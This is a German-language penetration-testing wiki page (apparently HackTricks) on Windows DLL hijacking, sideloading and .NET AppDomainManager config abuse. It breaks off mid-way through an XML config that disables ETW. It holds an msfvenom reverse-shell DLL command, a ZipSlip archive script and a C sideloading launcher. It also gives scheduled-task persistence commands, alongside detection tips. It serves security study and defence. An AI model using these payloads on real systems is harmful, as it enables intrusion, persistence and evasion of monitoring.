# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Grundlegende Informationen

Bei DLL Hijacking wird eine vertrauenswürdige Anwendung dazu gebracht, eine schädliche DLL zu laden. Der Begriff umfasst mehrere Taktiken wie **DLL Spoofing, Injection und Side-Loading**. Er wird hauptsächlich zur Codeausführung und zum Erreichen von Persistenz eingesetzt und seltener zur Rechteausweitung. Obwohl der Fokus hier auf der Rechteausweitung liegt, bleibt die Hijacking-Methode unabhängig vom Ziel gleich.

### Gängige Techniken

Für DLL Hijacking werden verschiedene Methoden verwendet. Wie effektiv sie sind, hängt davon ab, wie die Anwendung DLLs lädt:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Eine echte DLL wird durch eine schädliche ersetzt. Optional kann DLL Proxying eingesetzt werden, um die Funktionalität der ursprünglichen DLL beizubehalten.
2. **DLL Search Order Hijacking**: Die schädliche DLL wird in einem Suchpfad vor der legitimen platziert, um das Suchmuster der Anwendung auszunutzen.
3. **Phantom DLL Hijacking**: Es wird eine schädliche DLL erstellt, die eine Anwendung lädt, weil sie glaubt, eine nicht vorhandene erforderliche DLL gefunden zu haben.
4. **DLL Redirection**: Suchparameter wie `%PATH%` oder `.exe.manifest`- bzw. `.exe.local`-Dateien werden geändert, um die Anwendung zur schädlichen DLL umzuleiten.
5. **WinSxS DLL Replacement**: Die legitime DLL wird im WinSxS-Verzeichnis durch eine schädliche ersetzt. Diese Methode wird häufig mit DLL side-loading in Verbindung gebracht.
6. **Relative Path DLL Hijacking**: Die schädliche DLL wird zusammen mit der kopierten Anwendung in einem vom Benutzer kontrollierten Verzeichnis abgelegt. Das ähnelt Binary Proxy Execution-Techniken.

Eine Anwendung kann auch einen **eigenen DLL loader** implementieren. Ein privilegierter Prozess kann ein untergeordnetes Verzeichnis wie `Libraries` oder `Plugins` durchsuchen und eine ausgewählte DLL an einen Helfer übergeben – unabhängig von der normalen Windows-DLL-Suchreihenfolge. Wenn ein anderes Konto Dateien genau in diesem Verzeichnis erstellen kann, sollte dies als Ansatzpunkt für eine Prüfung behandelt werden: Identität des Prozesses, effektive ACL des Verzeichnisses, Dateiauswahlregel und einen erreichbaren Ladevorgang verifizieren. Ein beschreibbares Verzeichnis neben einer ausführbaren Datei belegt nicht, dass der Prozess DLLs daraus lädt.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}

### Post-installation PE import grafting

Beim klassischen Side-Loading bleibt die vertrauenswürdige PE-Datei unverändert und die DLL-Namensauflösung wird ausgenutzt. **Import grafting** verändert dagegen eine PE-Datei, die bereits vom vertrauenswürdigen Programm geladen wird. Der Angreifer fügt einen Importdeskriptor sowie die zugehörigen Lookup-/IAT-Einträge für eine vom Angreifer kontrollierte DLL hinzu. Wenn Windows diese Abhängigkeit rekursiv auflöst, bildet es die zusätzliche DLL in den Prozessspeicher ab und führt ihren Initialisierungscode innerhalb des ansonsten legitimen Prozesses aus. Dies ist eine Änderung an einer PE-Datei auf dem Datenträger und nicht dasselbe wie das Ersetzen eines aktiven IAT-Funktionszeigers durch einen Runtime-Hook.<sup>[[31]](#references)[[32]](#references)</sup>

Die veränderte PE-Datei kann eine zwischengelagerte Hersteller-DLL sein, statt der ausführbaren Datei, die der Benutzer oder der Task Scheduler startet. Eine wiederverwendbare Angriffskette sieht so aus:<sup>[[32]](#references)</sup>

1. Die legitime ausführbare Datei und ihre Abhängigkeiten in ein vom Angreifer kontrolliertes Verzeichnis kopieren.
2. Die Importstrukturen einer Abhängigkeit so patchen, dass sie auf die schädliche DLL verweisen, während die erwarteten Exporte und das normale Verhalten der Abhängigkeit erhalten bleiben.
3. Einen Autostart oder geplanten Task so konfigurieren, dass die legitime ausführbare Datei gestartet wird. Der Loader bildet die veränderte Abhängigkeit und anschließend die neu importierte DLL in den Prozessspeicher ab. Informationen zur Auflistung von Tasks finden Sie unter [Privilege Escalation with Autoruns](../privilege-escalation-with-autorun-binaries.md#scheduled-tasks).
4. Aufwendige Arbeiten aus `DllMain` heraushalten. Der beobachtete Loader erstellte einen Worker-Thread und setzte dort die schrittweise Entschlüsselung fort.

Dies unterscheidet sich von einer Supply-Chain-Kompromittierung auf Herstellerseite, wenn das Herstellerpaket sauber ist und die Importänderung erst nach der Installation erfolgt. Bei der Triage müssen alle Module im vorbereiteten Verzeichnis untersucht werden, nicht nur die Host-EXE: Importlisten und Hashes der Abhängigkeiten mit einer bekanntermaßen sauberen Installation vergleichen, Signaturen überprüfen und Hersteller-Binärdateien untersuchen, die von unerwarteten beschreibbaren Speicherorten wie `C:\ProgramData` gestartet werden. Ein geplanter Task, der auf einen kopierten Crash Reporter oder Updater in einem solchen Verzeichnis verweist, ist ein besonders nützlicher Ansatzpunkt.<sup>[[32]](#references)</sup>


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Klassisches DLL sideloading ist nicht die einzige Möglichkeit, einen vertrauenswürdigen **.NET Framework**-Prozess dazu zu bringen, vom Angreifer eingeschleusten Code zu laden. Wenn die Ziel-EXE eine **managed** Anwendung ist, berücksichtigt die CLR auch eine **Anwendungskonfigurationsdatei**, deren Name sich von der ausführbaren Datei ableitet (zum Beispiel `Setup.exe.config`). In dieser Datei kann ein benutzerdefinierter **AppDomainManager** festgelegt werden. Verweist die Konfiguration auf eine vom Angreifer kontrollierte Assembly neben der EXE, lädt die CLR diese **vor dem normalen Codepfad der Anwendung** und führt sie innerhalb des vertrauenswürdigen Prozesses aus.<sup>[[24]](#references)</sup>

Laut Microsofts .NET Framework-Konfigurationsschema müssen sowohl `<appDomainManagerAssembly>` als auch `<appDomainManagerType>` vorhanden sein, damit der benutzerdefinierte Manager verwendet wird.<sup>[[16]](#references)[[17]](#references)</sup>

Minimale Konfiguration:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Minimaler Manager:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Praktische Hinweise:
- Dies ist **spezifisches .NET Framework-Tradecraft**. Es basiert auf dem Parsen der CLR-Konfiguration, nicht auf der Win32-DLL-Suchreihenfolge.
- Der Host muss tatsächlich eine **verwaltete EXE** sein. Schnelle Triage: `sigcheck -m target.exe`, `corflags target.exe` oder nach dem **CLR Runtime Header** in den PE-Metadaten suchen.
- Der Konfigurationsdateiname muss exakt dem Namen der ausführbaren Datei entsprechen (`<binary>.config`) und befindet sich üblicherweise **neben der EXE**.
- Dies ist bei **signierten Microsoft-/Vendor-Binärdateien** nützlich, da die vertrauenswürdige EXE unverändert bleibt, während die schädliche verwaltete Assembly prozessintern ausgeführt wird.
- Wenn du bereits über ein beschreibbares Installations-/Updateverzeichnis verfügst, kann AppDomainManager-Hijacking als **erste Stufe** eingesetzt werden, gefolgt von klassischem DLL-Sideloading oder Reflective Loading für spätere Stufen.

### Signierter AppDomainManager-Typ als Konfigurationsdatei-Gadget

Der übliche AppDomainManager-Konfigurations-Hijack oben verweist auf eine Angreifer-Assembly. Ein anderer .NET Framework-Weg verwendet eine **signierte Assembly**, die neben dem Host abgelegt oder anderweitig aufgelöst wird und deren Manager-Typ vom Angreifer kontrollierte Sidecar-Daten liest. Der Angreifer benötigt weiterhin Kontrolle über die benachbarte `.exe.config` des verwalteten Hosts und die zusätzlichen Dateien; eine Signatur der ausgewählten Assembly macht deren Konfigurationseingabe nicht sicher. Der Konfigurationsmechanismus ist etabliertes AppDomainManager-Verhalten, während die unten beschriebene Verkettung mit dem signierten Typ in der NetamLoader-Analyse beobachtet wurde.<sup>[[16]](#references)[[17]](#references)[[35]](#references)</sup>

In dieser Kette wählt die Konfiguration `Microsoft.ApplicationServer.Caching.DataCacheFactoryConfiguration` aus `Microsoft.HostIntegration.Connectors` aus. Bei der Initialisierung wird im Anwendungsverzeichnis nach `fabric.config` gesucht. Ein `customType`-Eintrag benennt `System.Resources.ResXResourceSet` und übergibt `Resources.resx` als Konstruktorargument, wodurch ein Ressourcenparser erreicht wird, ohne eine vom Angreifer erstellte Manager-DLL mitzuliefern. Dafür müssen die signierte AppFabric-Assembly und die benannten Framework-Klassen auf dem Ziel aufgelöst werden können; dies ist keine universelle Eigenschaft jeder verwalteten EXE.<sup>[[35]](#references)</sup> Ein konfigurierter AppDomainManager erfordert außerdem eine Full-Trust-Anwendung; andernfalls löst die CLR eine `TypeLoadException` aus.<sup>[[16]](#references)[[17]](#references)</sup>

```xml
<!-- in <host>.exe.config -->
<configuration>
  <runtime>
    <appDomainManagerType value="Microsoft.ApplicationServer.Caching.DataCacheFactoryConfiguration" />
    <appDomainManagerAssembly value="Microsoft.HostIntegration.Connectors, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />
  </runtime>
</configuration>
```

```xml
<!-- adjacent fabric.config -->
<section name="foo">
  <customType className="System.Resources.ResXResourceSet, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089(Resources.resx)" />
</section>
```

Der Inhalt von `Resources.resx` ist der Deserialisierungs-Sink, nicht bloß eine Datendatei; siehe [RESX to BinaryFormatter and XAML](../../../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml). In der beschriebenen Phase leitete der XAML-Loader seinen AES-Schlüssel außerdem aus dem SHA-256-Hash der **vollständigen, kleingeschriebenen Host-Befehlszeile** ab und verwendete die ersten 16 Bytes des decodierten Blobs als IV. Werden die Dateien mit einer anderen Befehlszeile erneut ausgeführt, schlägt die Entschlüsselung daher fehl, bevor das nächste XAML geladen wird.<sup>[[35]](#references)</sup>

### AppDomainManager als Downloader + Bootstrap für geplante Aufgabe

Ein praxisnahes Intrusionsmuster besteht darin, die vertrauenswürdige verwaltete EXE mit einer bösartigen `*.config`-Datei und einer bösartigen AppDomainManager-DLL zu kombinieren, die nur als **kleiner Bootstrapper** dient:<sup>[[25]](#references)</sup>

1. Ein Benutzer startet einen signierten .NET-Installer oder Updater von einem glaubwürdigen Speicherort wie `%USERPROFILE%\Downloads`.
2. Die benachbarte Config-Datei veranlasst die CLR, **vor** dem Start der legitimen App-Logik die Assembly des Angreifers zu laden.
3. Der bösartige Manager führt eine **Pfadprüfung** durch (zum Beispiel nur fortfahren, wenn die Host-EXE aus `Downloads` ausgeführt wird, und die zweite Stufe nur aus `%LOCALAPPDATA%` starten lassen).
4. Wenn die Prüfung erfolgreich ist, lädt er die eigentliche Payload in einen benutzerschreibbaren Pfad wie `%LOCALAPPDATA%\PerfWatson2.exe` herunter und richtet mit einer geplanten Aufgabe Persistenz ein.

Warum diese Variante wichtig ist:
- Die signierte Host-EXE bleibt unverändert, sodass eine Triage, bei der nur die Hashes der Hauptdatei geprüft werden, den Kompromiss möglicherweise übersieht.
- Einfache **pfadbasierte Anti-Analyse** ist weit verbreitet: Das Verschieben des ZIP/EXE/DLL-Trios auf den Desktop, nach Temp oder in einen Sandbox-Pfad kann die Angriffskette absichtlich unterbrechen.
- Die AppDomainManager-DLL der ersten Stufe kann klein und unauffällig bleiben, während das eigentliche Implantat später heruntergeladen wird.

Minimales Persistenzbeispiel, das bei diesem Muster häufig zu sehen ist:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Hinweise:
- ` /rl highest` bedeutet **höchste verfügbare Berechtigungsstufe** für diesen Benutzer/diese Sitzung; dies allein garantiert keine SYSTEM-Eskalation.
- Diese Technik lässt sich oft besser als **Ausführung/Persistenz durch Missbrauch der .NET-Konfiguration** einordnen denn als klassisches Hijacking der DLL-Suchreihenfolge bei fehlenden DLLs, auch wenn Operatoren häufig beide Techniken miteinander kombinieren.

Erkennungspunkte:
- Signierte .NET-Executables, die aus **ZIP-Entpackungspfaden**, `Downloads`, `%TEMP%` oder anderen benutzerschreibbaren Ordnern gestartet werden und über eine **im selben Verzeichnis liegende** `<exe>.config` verfügen.
- Neue geplante Tasks, deren Aktion auf `%LOCALAPPDATA%`, `%APPDATA%` oder `Downloads` verweist und deren Namen Browser- oder Anbieter-Updatern ähneln.
- Kurzlebige verwaltete Bootstrap-Prozesse, die sofort ein weiteres EXE herunterladen und anschließend `schtasks.exe` starten.
- Samples, die vorzeitig beendet werden, sofern der Executable-Pfad nicht mit einem erwarteten Benutzerprofilverzeichnis übereinstimmt.

### Eine vorhandene geplante Aufgabe hijacken, um die Sideloading-Kette erneut zu starten

Sucht bei der Persistenz nicht nur nach dem **Erstellen einer neuen Aufgabe**. Manche Intrusion-Sets warten, bis ein legitimer Installer eine **normale Updater-Aufgabe** erstellt, und ändern dann die **Aufgabenaktion**, sodass Name, Autor und Trigger den Verteidigern weiterhin vertraut erscheinen.

Wiederverwendbarer Ablauf:
1. Installiert/führt die legitime Software aus und identifiziert die Aufgabe, die sie normalerweise erstellt.
2. Exportiert das Aufgaben-XML und notiert die aktuellen Werte von `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Ersetzt nur die Aktion, sodass die Aufgabe deine **vertrauenswürdige Host-EXE** aus einem benutzerschreibbaren Staging-Verzeichnis startet, die dann die echte Payload per Sideloading oder AppDomain lädt.
4. Registriert denselben Aufgabennamen erneut, statt ein neues, offensichtliches Persistenzartefakt zu erstellen.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Warum es unauffälliger ist:
- Der Aufgabenname kann weiterhin legitim wirken (z. B. wie der eines Updateprogramms eines Anbieters).
- Der **Task Scheduler-Dienst** startet die Aufgabe. Bei der Validierung von Eltern- und Vorfahrenprozessen wird daher oft die erwartete Planungskette statt `explorer.exe` angezeigt.
- DFIR-Teams, die nur nach **neuen Aufgabennamen** suchen, übersehen möglicherweise eine Aufgabe, deren Registrierung bereits vorhanden war, deren Aktion jetzt aber auf `%LOCALAPPDATA%`, `%APPDATA%` oder einen anderen vom Angreifer kontrollierten Pfad verweist.

Schnelle Suchansätze:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Vergleiche die XML-Dateien unter `C:\Windows\System32\Tasks\*` und die Metadaten unter `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` mit einer Baseline.
- Erzeuge einen Alert, wenn eine **wie von einem Anbieter stammende Updateaufgabe** aus **benutzerbeschreibbaren Verzeichnissen** ausgeführt wird oder eine .NET-EXE mit einer danebenliegenden `*.config`-Datei startet.

> [!TIP]
> Eine Schritt-für-Schritt-Kette, die HTML-Staging, AES-CTR-Konfigurationen und .NET-Implants mit DLL-Sideloading kombiniert, wird im folgenden Ablauf beschrieben.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

### Eine per Sideloading geladene Stage an die Befehlszeile des Dienstes binden

Eine per Sideloading geladene DLL kann mehr als den erwarteten Host-EXE- und DLL-Namen voraussetzen. Mandiant beschrieb einen Loader, der die Payload-Entschlüsselung an ein Befehlszeilenargument und den Namen der Host-Executable bindet.<sup>[[33]](#references)</sup> In einer späteren, durch einen Dienst gestützten Kette lud ein kopierter legitimer Host eine benachbarte `mscoree.dll`, die `LockClrVersion` exportierte und ihre eingebettete Stage erst entschlüsselte, nachdem sie einen AES-128-Schlüssel aus dem Dienstargument und dem Basisnamen der Host-Executable abgeleitet hatte. Jede Eingabe wurde auf 16 Bytes gekürzt oder mit NUL-Bytes aufgefüllt; der Schlüssel wurde byteweise als `argument XOR embedded_key XOR executable_basename` gebildet. Anschließend wurde die Payload mit AES-CBC ohne Padding entschlüsselt. Wird der Host umbenannt oder ohne das erwartete Argument gestartet, ändert sich der Schlüssel und die Stage kann nicht entschlüsselt werden, selbst wenn die DLL weiterhin geladen wird. Bei der Reproduktion oder Analyse dieser Variante müssen das exakte Befehlszeilenargument und der Basisname beibehalten werden.<sup>[[34]](#references)</sup>

Dies ist ein **Payload-Gate, das auf gewöhnliches DLL-Sideloading aufsetzt**, keine neue DLL-Suchreihenfolgeregel und für sich genommen auch kein Privilegienausweitungsmechanismus. Der Sicherheitskontext des Dienstes bestimmt die resultierende Berechtigungsstufe. Der [GitHub issue/file C2-Workflow](../../../generic-methodologies-and-resources/github-issues-and-repository-files-c2.md) dokumentiert den späteren Transport separat.<sup>[[34]](#references)</sup>

## Fehlende DLLs finden

Die gängigste Methode, fehlende DLLs auf einem System zu finden, ist, [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) aus den Sysinternals auszuführen und die **folgenden 2 Filter zu setzen**:

![Gängige Techniken – Fehlende DLLs finden: Die gängigste Methode, fehlende DLLs auf einem System zu finden, ist, procmon aus den Sysinternals auszuführen und die folgenden 2 Filter zu setzen](<../../../images/image (961).png>)

![Gängige Techniken – Fehlende DLLs finden: Die gängigste Methode, fehlende DLLs auf einem System zu finden, ist, procmon aus den Sysinternals auszuführen und die folgenden 2 Filter zu setzen](<../../../images/image (230).png>)

und nur die **File System Activity** anzuzeigen:

![Gängige Techniken – Fehlende DLLs finden: und nur die File System Activity anzeigen](<../../../images/image (153).png>)

Wenn du **generell nach fehlenden DLLs** suchst, lässt du das **einige Sekunden** laufen.\
Wenn du nach einer **fehlenden DLL in einer bestimmten Executable** suchst, setzt du einen weiteren Filter, etwa **"Process Name" "contains" `<exec name>`**, führst sie aus und beendest die Ereigniserfassung.<sup>[[9]](#references)</sup>

## Fehlende DLLs ausnutzen

Um Privilegien auszuweiten, suche nach einer **DLL, die ein privilegierter Prozess von einem Pfad zu laden versucht, in den du schreiben kannst**. Das kann passieren, wenn du ein Verzeichnis kontrollierst, das vor dem Verzeichnis mit der legitimen DLL durchsucht wird, oder wenn die angeforderte DLL nicht existiert und du in eines der durchsuchten Verzeichnisse schreiben kannst.

### DLL-Suchreihenfolge

**In der** [**Microsoft-Dokumentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **erfährst du genau, wie DLLs geladen werden.**

**Windows-Anwendungen** suchen nach DLLs, indem sie einer Reihe **vordefinierter Suchpfade** in einer bestimmten Reihenfolge folgen. DLL hijacking wird möglich, wenn eine schädliche DLL strategisch in einem dieser Verzeichnisse platziert wird, sodass sie vor der legitimen DLL geladen wird. Um dies zu verhindern, sollte die Anwendung beim Verweisen auf benötigte DLLs absolute Pfade verwenden.

Im Folgenden siehst du die **DLL-Suchreihenfolge auf 32-Bit-Systemen**:

1. Das Verzeichnis, aus dem die Anwendung geladen wurde.
2. Das Systemverzeichnis. Verwende die Funktion [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya), um den Pfad dieses Verzeichnisses abzurufen.(_C:\Windows\System32_)
3. Das 16-Bit-Systemverzeichnis. Es gibt keine Funktion, mit der sich der Pfad dieses Verzeichnisses abrufen lässt, es wird aber durchsucht. (_C:\Windows\System_)
4. Das Windows-Verzeichnis. Verwende die Funktion [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya), um den Pfad dieses Verzeichnisses abzurufen.
   1. (_C:\Windows_)
5. Das aktuelle Verzeichnis.
6. Die Verzeichnisse, die in der Umgebungsvariable PATH aufgeführt sind. Beachte, dass der anwendungsspezifische Pfad, der im Registrierungsschlüssel **App Paths** angegeben ist, nicht dazugehört. Der Schlüssel **App Paths** wird bei der Berechnung des DLL-Suchpfads nicht verwendet.

Das ist die **Standard**-Suchreihenfolge, wenn **SafeDllSearchMode** aktiviert ist. Ist die Funktion deaktiviert, rückt das aktuelle Verzeichnis auf den zweiten Platz vor. Um diese Funktion zu deaktivieren, erstelle den Registrierungswert **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** und setze ihn auf 0 (standardmäßig aktiviert).

Wird die Funktion [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) mit **LOAD_WITH_ALTERED_SEARCH_PATH** aufgerufen, beginnt die Suche im Verzeichnis des ausführbaren Moduls, das **LoadLibraryEx** lädt.

Eine DLL kann schließlich auch über ihren absoluten Pfad statt über ihren Namen geladen werden. In diesem Fall sucht Windows nur an diesem Pfad nach der DLL selbst; Abhängigkeiten, die über ihren Namen angefordert werden, folgen weiterhin der jeweils geltenden Suchreihenfolge.

Es gibt weitere Möglichkeiten, die Suchreihenfolge zu ändern, auf die ich hier aber nicht eingehen werde.

### Einen beliebigen Dateischreibzugriff mit einem Missing-DLL-Hijack kombinieren

**Verwandte Technik:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Verwende **ProcMon**-Filter (`Process Name` = Ziel-EXE, `Path` endet mit `.dll`, `Result` = `NAME NOT FOUND`), um DLL-Namen zu erfassen, nach denen der Prozess sucht, die er aber nicht findet.<sup>[[14]](#references)</sup>
2. Wenn die Binärdatei **zeitgesteuert oder als Dienst** ausgeführt wird, wird eine DLL mit einem dieser Namen, die im **Anwendungsverzeichnis** (Suchpfadeintrag Nr. 1) abgelegt wird, beim nächsten Start geladen. In einem Fall mit einem .NET-Scanner suchte der Prozess nach `hostfxr.dll` unter `C:\samples\app\`, bevor er die echte Kopie unter `C:\Program Files\dotnet\fxr\...` lud.
3. Erstelle eine Payload-DLL (z. B. eine Reverse Shell) mit einem beliebigen Export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Wenn dein Primitive ein **ZipSlip-artiger beliebiger Schreibzugriff** ist, erstelle eine ZIP-Datei mit einem Eintrag, der aus dem Extraktionsverzeichnis herausführt, sodass die DLL im Anwendungsverzeichnis landet:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Lege das Archiv im überwachten Posteingang/Share ab. Wenn die geplante Aufgabe den Prozess erneut startet, lädt dieser die schädliche DLL und führt deinen Code als Dienstkonto aus.

### Sideloading über RTL_USER_PROCESS_PARAMETERS.DllPath erzwingen

Eine fortgeschrittene Möglichkeit, den DLL-Suchpfad eines neu erstellten Prozesses deterministisch zu beeinflussen, besteht darin, beim Erstellen des Prozesses mit den nativen APIs von ntdll das Feld DllPath in RTL_USER_PROCESS_PARAMETERS festzulegen. Wenn du hier ein vom Angreifer kontrolliertes Verzeichnis angibst, kann ein Zielprozess, der eine importierte DLL anhand ihres Namens auflöst (kein absoluter Pfad und keine sicheren Ladeflags), dazu gezwungen werden, eine schädliche DLL aus diesem Verzeichnis zu laden.

Grundidee
- Erstelle die Prozessparameter mit RtlCreateProcessParametersEx und gib einen benutzerdefinierten DllPath an, der auf deinen kontrollierten Ordner verweist (z. B. das Verzeichnis, in dem sich dein Dropper/Unpacker befindet).
- Erstelle den Prozess mit RtlCreateUserProcess. Wenn die Zieldatei eine DLL anhand ihres Namens auflöst, berücksichtigt der Loader bei der Auflösung den angegebenen DllPath. So wird zuverlässiges Sideloading ermöglicht, selbst wenn sich die schädliche DLL nicht im selben Verzeichnis wie die Ziel-EXE befindet.

Hinweise/Einschränkungen
- Dies betrifft den erstellten untergeordneten Prozess. Es unterscheidet sich von SetDllDirectory, das nur den aktuellen Prozess betrifft.
- Das Ziel muss eine DLL anhand ihres Namens importieren oder mit LoadLibrary laden (kein absoluter Pfad und keine Verwendung von LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs und fest codierte absolute Pfade können nicht hijacked werden. Weitergeleitete Exporte und SxS können die Priorität ändern.

Minimales C-Beispiel (ntdll, Wide Strings, vereinfachte Fehlerbehandlung):

<details>
<summary>Vollständiges C-Beispiel: DLL-Sideloading über RTL_USER_PROCESS_PARAMETERS.DllPath erzwingen</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Beispiel für die operative Verwendung
- Platziere eine bösartige xmllite.dll (die erforderlichen Funktionen exportierend oder als Proxy zur echten DLL) in deinem DllPath-Verzeichnis.
- Starte eine signierte Binärdatei, von der bekannt ist, dass sie mithilfe der obigen Technik anhand des Namens nach xmllite.dll sucht. Der Loader löst den Import über den angegebenen DllPath auf und lädt deine DLL per Sideloading.

Diese Technik wurde in freier Wildbahn zum Aufbau mehrstufiger Sideloading-Ketten beobachtet: Ein initialer Launcher legt eine Hilfs-DLL ab, die anschließend eine von Microsoft signierte, hijackbare Binärdatei mit einem benutzerdefinierten DllPath startet, um das Laden der Angreifer-DLL aus einem Staging-Verzeichnis zu erzwingen.<sup>[[6]](#references)</sup>


### .NET AppDomainManager hijacking via `.exe.config`

Bei Zielen mit **.NET Framework** lässt sich Sideloading **vor `Main()`** durchführen, ohne den Speicher zu patchen, indem die benachbarte **`.exe.config`**-Datei der Anwendung missbraucht wird. Statt sich ausschließlich auf die Win32-DLL-Suchreihenfolge zu verlassen, platziert der Angreifer eine legitime .NET-EXE neben einer bösartigen Konfigurationsdatei und einer oder mehreren vom Angreifer kontrollierten Assemblys.

Ablauf der Kette:<sup>[[15]](#references)[[22]](#references)</sup>
1. Die Host-EXE startet und die **CLR liest `<exe>.config`**.
2. Die Konfiguration legt **`<appDomainManagerAssembly>`** und **`<appDomainManagerType>`** fest, sodass die Laufzeitumgebung einen vom Angreifer kontrollierten `AppDomainManager` instanziiert.
3. Der bösartige Manager erhält **Ausführung vor `Main()`** innerhalb des vertrauenswürdigen Host-Prozesses.
4. Dieselbe Konfiguration kann die CLR dazu zwingen, zunächst lokale Assemblys aufzulösen (zum Beispiel `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`), und die Laufzeitvalidierung sowie Telemetrie ohne Inline-Patching abschwächen.

Kampagnenartiges Muster (die genaue Verschachtelung kann je nach Direktive/CLR-Version variieren):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
